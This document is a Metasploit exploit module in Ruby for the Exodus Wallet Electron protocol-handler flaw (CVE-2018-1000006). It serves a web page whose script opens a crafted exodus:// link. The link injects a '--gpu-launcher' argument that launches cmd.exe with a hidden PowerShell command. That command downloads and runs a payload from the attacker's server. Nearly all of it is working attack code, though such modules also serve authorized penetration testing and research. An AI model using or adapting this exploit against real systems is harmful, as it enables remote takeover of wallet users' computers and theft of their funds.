# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core/exploit/powershell&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking
 
  include Msf::Exploit::EXE
  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::HttpServer::HTML
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;         => &#039;Exodus Wallet (ElectronJS Framework) remote Code Execution&#039;,
      &#039;Description&#039;  => %q(
         This module exploits a Remote Code Execution vulnerability in Exodus Wallet,
         a vulnerability in the ElectronJS Framework protocol handler can be used to
         get arbitrary command execution if the user clicks on a specially crafted URL.
      ),
      &#039;License&#039;      => MSF_LICENSE,
      &#039;Author&#039;       =>
        [
          &#039;Wflki&#039;,          # Original exploit author
          &#039;Daniel Teixeira&#039; # MSF module author
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;SRVPORT&#039;    => &#039;80&#039;,
          &#039;URIPATH&#039;    => &#039;/&#039;,
        },
      &#039;References&#039;     =>
        [
          [ &#039;EDB&#039;, &#039;43899&#039; ],
          [ &#039;BID&#039;, &#039;102796&#039; ],
          [ &#039;CVE&#039;, &#039;2018-1000006&#039; ],
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;PSH (Binary)&#039;, {
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Arch&#039; => [ARCH_X86, ARCH_X64]
          }]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jan 25 2018&#039;
    ))
 
  register_advanced_options(
    [
      OptBool.new(&#039;PSH-Proxy&#039;, [ true,  &#039;PSH - Use the system proxy&#039;, true ]),
    ], self.class
  )
  end
 
  def gen_psh(url)
      ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl
 
      download_string = datastore[&#039;PSH-Proxy&#039;] ? (Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(url)) : (Rex::Powershell::PshMethods.download_and_exec_string(url))
 
      download_and_run = "#{ignore_cert}#{download_string}"
 
      return generate_psh_command_line(noprofile: true, windowstyle: &#039;hidden&#039;, command: download_and_run)
  end
 
  def serve_payload(cli)
   data = cmd_psh_payload(payload.encoded,
      payload_instance.arch.first,
      remove_comspec: true,
      exec_in_place: true
    )
 
    print_status("Delivering Payload")
    send_response_html(cli, data, &#039;Content-Type&#039; => &#039;application/octet-stream&#039;)
  end
 
  def serve_page(cli)
    psh = gen_psh("#{get_uri}payload")
    psh_escaped = psh.gsub("\\","\\\\\\\\").gsub("&#039;","\\\\&#039;")
    val = rand_text_alpha(5)
 
    html = %Q|<html>
<!doctype html>
<script>
  window.location = &#039;exodus://#{val}" --gpu-launcher="cmd.exe /k #{psh_escaped}" --#{val}=&#039;
</script>
</html>
|
    send_response_html(cli, html)
  end
 
  def on_request_uri(cli, request)
    case request.uri
    when /payload$/
      serve_payload(cli)
    else
      serve_page(cli)
    end
  end
 
end

